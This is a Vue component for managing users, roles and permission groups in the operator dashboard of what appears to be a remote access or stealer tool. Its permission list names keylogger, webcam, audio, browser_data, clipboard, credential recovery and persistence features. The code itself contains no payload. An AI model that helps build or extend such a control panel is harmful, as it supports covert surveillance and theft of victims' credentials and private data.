<script setup lang="ts">
import { ref, computed, onMounted } from 'vue'
import { api } from '../lib/api'
import AppSelect from '../components/ui/AppSelect.vue'

interface PermissionGroup {
  id: string; name: string; description?: string; color?: string
  permissions: string[]; createdAt: string
}
interface User {
  id: string; username: string; role: string; enabled: boolean
  permissionGroups?: string[]; featurePermissions?: string[]
  pluginAccess?: Record<string, any>; lastLogin?: string; createdAt: string
}

const users = ref<User[]>([])
const permissionGroups = ref<PermissionGroup[]>([])
const loading = ref(true)
const activeTab = ref<'users' | 'groups'>('users')
const search = ref('')
const showModal = ref(false)
const showGroupModal = ref(false)
const showPermsModal = ref(false)
const editingUser = ref<User | null>(null)
const editingGroup = ref<PermissionGroup | null>(null)
const form = ref({ username: '', password: '', role: 'viewer' })
const groupForm = ref({ name: '', description: '', color: '#6366f1', permissions: [] as string[] })
const userPermsForm = ref({ permissionGroups: [] as string[], featurePermissions: [] as string[], pluginAccess: {} as Record<string, any> })
const saving = ref(false)
const error = ref('')
const success = ref('')

const ALL_ROLES = ['admin', 'operator', 'viewer']
const ALL_FEATURES = [
  'clients', 'groups', 'console', 'file_manager', 'scripts', 'processes',
  'screenshots', 'keylogger', 'webcam', 'audio', 'browser_data', 'clipboard',
  'recovery', 'registry', 'persistence', 'deploy', 'update', 'build',
  'settings', 'users', 'logs', 'notifications', 'purgatory', 'backup',
]

const filteredUsers = computed(() => {
  if (!search.value) return users.value
  const q = search.value.toLowerCase()
  return users.value.filter(u => u.username.toLowerCase().includes(q) || u.role.includes(q))
})

const filteredGroups = computed(() => {
  if (!search.value) return permissionGroups.value
  const q = search.value.toLowerCase()
  return permissionGroups.value.filter(g => g.name.toLowerCase().includes(q))
})

async function loadAll() {
  loading.value = true
  try {
    const [u, g] = await Promise.all([
      api.get<{ users: User[] }>('/api/users').catch(() => ({ users: [] })),
      api.get<{ groups: PermissionGroup[] }>('/api/permission-groups').catch(() => ({ groups: [] })),
    ])
    users.value = u.users || []
    permissionGroups.value = g.groups || []
  } catch {} finally { loading.value = false }
}

function openCreate() { editingUser.value = null; form.value = { username: '', password: '', role: 'viewer' }; showModal.value = true }
function openEdit(u: User) { editingUser.value = u; form.value = { username: u.username, password: '', role: u.role }; showModal.value = true }
function openGroupCreate() { editingGroup.value = null; groupForm.value = { name: '', description: '', color: '#6366f1', permissions: [] }; showGroupModal.value = true }
function openGroupEdit(g: PermissionGroup) { editingGroup.value = g; groupForm.value = { name: g.name, description: g.description || '', color: g.color || '#6366f1', permissions: [...(g.permissions || [])] }; showGroupModal.value = true }
function openUserPerms(u: User) { editingUser.value = u; userPermsForm.value = { permissionGroups: [...(u.permissionGroups || [])], featurePermissions: [...(u.featurePermissions || [])], pluginAccess: { ...(u.pluginAccess || {}) } }; showPermsModal.value = true }

async function saveUser() {
  saving.value = true; error.value = ''
  try {
    if (editingUser.value) {
      await api.put(`/api/users/${editingUser.value.id}/role`, { role: form.value.role })
      if (form.value.password) { await api.put(`/api/users/${editingUser.value.id}/password`, { newPassword: form.value.password }) }
    } else {
      await api.post('/api/users', { username: form.value.username, password: form.value.password, role: form.value.role })
    }
    success.value = editingUser.value ? 'User updated' : 'User created'; showModal.value = false; await loadAll()
  } catch (e: any) { error.value = e.message } finally { saving.value = false }
}

async function deleteUser(u: User) {
  if (!confirm(`Delete user "${u.username}"?`)) return
  try { await api.delete(`/api/users/${u.id}`); success.value = 'User deleted'; await loadAll() } catch (e: any) { error.value = e.message }
}

async function toggleUser(u: User) {
  try {
    await api.put(`/api/users/${u.id}/can-build`, { canBuild: !u.enabled })
    success.value = u.enabled ? 'User disabled' : 'User enabled'; await loadAll()
  } catch (e: any) { error.value = e.message }
}

async function saveGroup() {
  saving.value = true; error.value = ''
  try {
    if (editingGroup.value) { await api.patch(`/api/permission-groups/${editingGroup.value.id}`, groupForm.value) }
    else { await api.post('/api/permission-groups', groupForm.value) }
    success.value = editingGroup.value ? 'Group updated' : 'Group created'; showGroupModal.value = false; await loadAll()
  } catch (e: any) { error.value = e.message } finally { saving.value = false }
}

async function deleteGroup(g: PermissionGroup) {
  if (!confirm(`Delete group "${g.name}"?`)) return
  try { await api.delete(`/api/permission-groups/${g.id}`); success.value = 'Group deleted'; await loadAll() } catch (e: any) { error.value = e.message }
}

async function saveUserPerms() {
  if (!editingUser.value) return
  saving.value = true; error.value = ''
  try {
    await api.put(`/api/users/${editingUser.value.id}/permission-groups`, { groupIds: userPermsForm.value.permissionGroups })
    const featurePerms: Record<string, boolean> = {}
    for (const f of userPermsForm.value.featurePermissions) { featurePerms[f] = true }
    await api.put(`/api/users/${editingUser.value.id}/feature-permissions`, { permissions: featurePerms })
    success.value = 'Permissions updated'; showPermsModal.value = false; await loadAll()
  } catch (e: any) { error.value = e.message } finally { saving.value = false }
}

function timeSince(ts?: string) {
  if (!ts) return 'Never'
  const diff = Date.now() - new Date(ts).getTime()
  if (diff < 60000) return 'Just now'
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`
  return `${Math.floor(diff / 86400000)}d ago`
}

function roleBadge(r: string) {
  if (r === 'admin') return { bg: 'rgba(99,102,241,0.15)', color: '#818cf8', border: 'rgba(99,102,241,0.3)' }
  if (r === 'operator') return { bg: 'rgba(168,85,247,0.15)', color: '#c084fc', border: 'rgba(168,85,247,0.3)' }
  return { bg: 'rgba(100,116,139,0.15)', color: '#94a3b8', border: 'rgba(100,116,139,0.3)' }
}

onMounted(loadAll)
</script>

<template>
  <div>
    <div class="section-header">
      <h1 class="section-title"><i class="fa-solid fa-users-gear" style="margin-right:8px;color:#a78bfa"></i>User Management</h1>
      <div style="display:flex;gap:8px">
        <input v-model="search" placeholder="Search..." class="input" style="width:180px;padding:6px 10px;font-size:12px" />
        <button v-if="activeTab==='users'" @click="openCreate" class="btn btn-primary btn-sm"><i class="fa-solid fa-plus"></i> New User</button>
        <button v-if="activeTab==='groups'" @click="openGroupCreate" class="btn btn-primary btn-sm"><i class="fa-solid fa-plus"></i> New Group</button>
        <button @click="loadAll" class="btn btn-sm"><i class="fa-solid fa-rotate"></i></button>
      </div>
    </div>

    <div v-if="error" class="alert alert-error" style="margin-bottom:16px"><i class="fa-solid fa-circle-exclamation"></i>{{ error }}</div>
    <div v-if="success" class="alert alert-success" style="margin-bottom:16px"><i class="fa-solid fa-circle-check"></i>{{ success }}</div>

    <div style="display:flex;gap:2px;margin-bottom:20px;border-bottom:1px solid var(--cv-border)">
      <button class="settings-tab" :class="{'settings-tab-active': activeTab==='users'}" @click="activeTab='users'">
        <i class="fa-solid fa-user" style="margin-right:6px"></i>Users
      </button>
      <button class="settings-tab" :class="{'settings-tab-active': activeTab==='groups'}" @click="activeTab='groups'">
        <i class="fa-solid fa-users" style="margin-right:6px"></i>Groups
      </button>
    </div>

    <div v-if="loading" class="loading-state"><i class="fa-solid fa-spinner fa-spin"></i> Loading...</div>
    <template v-else>
      <!-- Users tab -->
      <div v-if="activeTab === 'users'">
        <div class="table-container">
          <table class="data-table">
            <thead><tr><th>User</th><th>Role</th><th>Groups</th><th>Last Login</th><th style="width:120px">Actions</th></tr></thead>
            <tbody>
              <tr v-for="u in filteredUsers" :key="u.id">
                <td>
                  <div style="display:flex;align-items:center;gap:8px">
                    <div style="width:28px;height:28px;border-radius:7px;background:rgba(99,102,241,0.15);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#818cf8">{{ u.username.charAt(0).toUpperCase() }}</div>
                    <div><div style="font-size:13px;font-weight:500;color:#e2e8f0">{{ u.username }}</div><div style="font-size:11px;color:#64748b">{{ timeSince(u.lastLogin) }}</div></div>
                  </div>
                </td>
                <td><span class="badge badge-sm" :style="roleBadge(u.role)">{{ u.role }}</span></td>
                <td>
                  <div style="display:flex;gap:4px;flex-wrap:wrap">
                    <span v-for="g in u.permissionGroups || []" :key="g" class="badge badge-sm" style="background:rgba(168,85,247,0.1);color:#c084fc;border-color:rgba(168,85,247,0.25)">{{ permissionGroups.find(pg=>pg.id===g)?.name || g }}</span>
                  </div>
                </td>
                <td style="font-size:12px;color:#64748b">{{ timeSince(u.lastLogin) }}</td>
                <td>
                  <div style="display:flex;gap:4px">
                    <button @click="openEdit(u)" class="btn btn-xs" title="Edit"><i class="fa-solid fa-pen"></i></button>
                    <button @click="openUserPerms(u)" class="btn btn-xs" title="Permissions"><i class="fa-solid fa-shield-halved"></i></button>
                    <button @click="toggleUser(u)" class="btn btn-xs" :title="u.enabled?'Disable':'Enable'"><i :class="u.enabled?'fa-solid fa-ban':'fa-solid fa-check'" :style="{color:u.enabled?'#f59e0b':'#22c55e'}"></i></button>
                    <button @click="deleteUser(u)" class="btn btn-xs" title="Delete"><i class="fa-solid fa-trash" style="color:#ef4444"></i></button>
                  </div>
                </td>
              </tr>
              <tr v-if="!filteredUsers.length"><td colspan="5" class="empty-cell">No users found</td></tr>
            </tbody>
          </table>
        </div>
      </div>

      <!-- Groups tab -->
      <div v-if="activeTab === 'groups'">
        <div style="display:grid;grid-template-columns:repeat(auto-fill, minmax(300px, 1fr));gap:12px">
          <div v-for="g in filteredGroups" :key="g.id" class="card" style="padding:16px">
            <div style="display:flex;justify-content:space-between;align-items:start;margin-bottom:10px">
              <div>
                <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
                  <span :style="{width:'10px',height:'10px',borderRadius:'3px',background:g.color || '#6366f1'}"></span>
                  <span style="font-size:14px;font-weight:600;color:#e2e8f0">{{ g.name }}</span>
                </div>
                <div style="font-size:12px;color:#64748b">{{ g.description || 'No description' }}</div>
              </div>
              <div style="display:flex;gap:4px">
                <button @click="openGroupEdit(g)" class="btn btn-xs"><i class="fa-solid fa-pen"></i></button>
                <button @click="deleteGroup(g)" class="btn btn-xs"><i class="fa-solid fa-trash" style="color:#ef4444"></i></button>
              </div>
            </div>
            <div style="display:flex;flex-wrap:wrap;gap:4px">
              <span v-for="p in g.permissions || []" :key="p" class="badge badge-sm" style="background:rgba(56,189,248,0.1);color:#38bdf8;border-color:rgba(56,189,248,0.25)">{{ p }}</span>
              <span v-if="!g.permissions?.length" style="font-size:11px;color:#475569">No permissions assigned</span>
            </div>
          </div>
          <div v-if="!filteredGroups.length" style="padding:40px;text-align:center;color:#475569;font-size:13px;grid-column:1/-1">No permission groups created yet</div>
        </div>
      </div>
    </template>

    <!-- User Modal -->
    <div v-if="showModal" class="modal-overlay" @click.self="showModal = false">
      <div class="modal" style="max-width:420px">
        <div class="modal-header"><h3 class="modal-title">{{ editingUser ? 'Edit User' : 'New User' }}</h3><button @click="showModal=false" class="modal-close"><i class="fa-solid fa-xmark"></i></button></div>
        <div style="display:flex;flex-direction:column;gap:12px">
          <div><label style="font-size:11px;color:#94a3b8;margin-bottom:4px;display:block">Username</label><input v-model="form.username" class="input" style="width:100%" :disabled="!!editingUser" /></div>
          <div><label style="font-size:11px;color:#94a3b8;margin-bottom:4px;display:block">Password {{ editingUser ? '(leave empty to keep)' : '' }}</label><input v-model="form.password" type="password" class="input" style="width:100%" /></div>
          <div><label style="font-size:11px;color:#94a3b8;margin-bottom:4px;display:block">Role</label>
            <AppSelect v-model="form.role" :options="ALL_ROLES.map(r => ({ value: r, label: r }))" /></div>
        </div>
        <div class="modal-actions"><button @click="showModal=false" class="btn btn-sm">Cancel</button><button @click="saveUser" :disabled="saving" class="btn btn-primary btn-sm"><i v-if="saving" class="fa-solid fa-spinner fa-spin"></i> Save</button></div>
      </div>
    </div>

    <!-- Group Modal -->
    <div v-if="showGroupModal" class="modal-overlay" @click.self="showGroupModal = false">
      <div class="modal" style="max-width:480px">
        <div class="modal-header"><h3 class="modal-title">{{ editingGroup ? 'Edit Group' : 'New Group' }}</h3><button @click="showGroupModal=false" class="modal-close"><i class="fa-solid fa-xmark"></i></button></div>
        <div style="display:flex;flex-direction:column;gap:12px">
          <div><label style="font-size:11px;color:#94a3b8;margin-bottom:4px;display:block">Name</label><input v-model="groupForm.name" class="input" style="width:100%" /></div>
          <div><label style="font-size:11px;color:#94a3b8;margin-bottom:4px;display:block">Description</label><input v-model="groupForm.description" class="input" style="width:100%" /></div>
          <div><label style="font-size:11px;color:#94a3b8;margin-bottom:4px;display:block">Color</label><input v-model="groupForm.color" type="color" style="width:40px;height:30px;border:none;background:none;cursor:pointer" /></div>
          <div><label style="font-size:11px;color:#94a3b8;margin-bottom:6px;display:block">Permissions</label>
            <div style="display:flex;flex-wrap:wrap;gap:4px">
              <label v-for="p in ALL_FEATURES" :key="p" style="display:flex;align-items:center;gap:4px;padding:4px 8px;border-radius:6px;font-size:11px;cursor:pointer" :style="{background: groupForm.permissions.includes(p) ? 'rgba(99,102,241,0.15)' : 'rgba(30,41,59,0.5)', color: groupForm.permissions.includes(p) ? '#818cf8' : '#64748b', border: '1px solid ' + (groupForm.permissions.includes(p) ? 'rgba(99,102,241,0.3)' : 'rgba(51,65,85,0.4)')}">
                <input type="checkbox" :value="p" v-model="groupForm.permissions" style="display:none" />{{ p }}
              </label>
            </div>
          </div>
        </div>
        <div class="modal-actions"><button @click="showGroupModal=false" class="btn btn-sm">Cancel</button><button @click="saveGroup" :disabled="saving" class="btn btn-primary btn-sm"><i v-if="saving" class="fa-solid fa-spinner fa-spin"></i> Save</button></div>
      </div>
    </div>

    <!-- User Permissions Modal -->
    <div v-if="showPermsModal && editingUser" class="modal-overlay" @click.self="showPermsModal = false">
      <div class="modal" style="max-width:520px">
        <div class="modal-header"><h3 class="modal-title">Permissions — {{ editingUser.username }}</h3><button @click="showPermsModal=false" class="modal-close"><i class="fa-solid fa-xmark"></i></button></div>
        <div style="display:flex;flex-direction:column;gap:16px">
          <div>
            <label style="font-size:11px;color:#94a3b8;margin-bottom:6px;display:block">Permission Groups</label>
            <div style="display:flex;flex-wrap:wrap;gap:6px">
              <label v-for="g in permissionGroups" :key="g.id" style="display:flex;align-items:center;gap:5px;padding:5px 10px;border-radius:7px;font-size:12px;cursor:pointer" :style="{background: userPermsForm.permissionGroups.includes(g.id) ? 'rgba(168,85,247,0.15)' : 'rgba(30,41,59,0.5)', color: userPermsForm.permissionGroups.includes(g.id) ? '#c084fc' : '#64748b', border: '1px solid ' + (userPermsForm.permissionGroups.includes(g.id) ? 'rgba(168,85,247,0.3)' : 'rgba(51,65,85,0.4)')}">
                <input type="checkbox" :value="g.id" v-model="userPermsForm.permissionGroups" style="display:none" />{{ g.name }}
              </label>
            </div>
          </div>
          <div>
            <label style="font-size:11px;color:#94a3b8;margin-bottom:6px;display:block">Feature Permissions</label>
            <div style="display:flex;flex-wrap:wrap;gap:4px">
              <label v-for="f in ALL_FEATURES" :key="f" style="display:flex;align-items:center;gap:4px;padding:4px 8px;border-radius:6px;font-size:11px;cursor:pointer" :style="{background: userPermsForm.featurePermissions.includes(f) ? 'rgba(56,189,248,0.12)' : 'rgba(30,41,59,0.5)', color: userPermsForm.featurePermissions.includes(f) ? '#38bdf8' : '#64748b', border: '1px solid ' + (userPermsForm.featurePermissions.includes(f) ? 'rgba(56,189,248,0.3)' : 'rgba(51,65,85,0.4)')}">
                <input type="checkbox" :value="f" v-model="userPermsForm.featurePermissions" style="display:none" />{{ f }}
              </label>
            </div>
          </div>
        </div>
        <div class="modal-actions"><button @click="showPermsModal=false" class="btn btn-sm">Cancel</button><button @click="saveUserPerms" :disabled="saving" class="btn btn-primary btn-sm"><i v-if="saving" class="fa-solid fa-spinner fa-spin"></i> Save Permissions</button></div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.settings-tab { padding:10px 16px; font-size:0.875rem; font-weight:500; color:#64748b; background:transparent; border:none; border-bottom:2px solid transparent; transition:all 140ms ease; cursor:pointer; }
.settings-tab:hover { color:#94a3b8; }
.settings-tab-active { color:#e8edf2; border-bottom-color:#6366f1; }
</style>
